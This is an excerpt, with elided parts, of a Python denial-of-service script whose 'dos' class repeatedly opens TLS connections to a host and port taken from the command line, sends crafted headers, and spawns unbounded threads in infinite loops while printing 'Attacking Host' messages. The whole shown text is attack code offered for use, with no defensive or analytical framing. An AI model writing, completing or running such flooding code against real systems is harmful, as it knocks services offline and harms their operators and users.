...
class dos:
    ...
    def socks(self,host,port,header):
        ...
        ssl_sock=get_ssl.wrap_socket(socket.socket(socket.AF_INET,socket.SOCK_STREAM),server_hostname=host)
        ssl_sock.connect((host,int(port)))
        ssl_sock.send(header.encode())
        ssl_sock.close()
        ...
        if len(sys.argv)>3:
            ...
            while True:
                ...
                try:
                    ...
                    Thread(target=self.socks,args=(sys.argv[1],sys.argv[2],self.header(sys.argv[2],sys.argv[3]))).start()
                    print("[+] Attacking Host -> "+sys.argv[1]+" | Port -> "+str(sys.argv[2]))
            ...
            while True:
                ...
                try:
                    ...
                    Thread(target=self.socks,args=(sys.argv[1],sys.argv[2],self.header(sys.argv[2],param))).start()
                    print("[+] Attacking Host -> "+sys.argv[1]+" | Port -> "+str(sys.argv[2]))
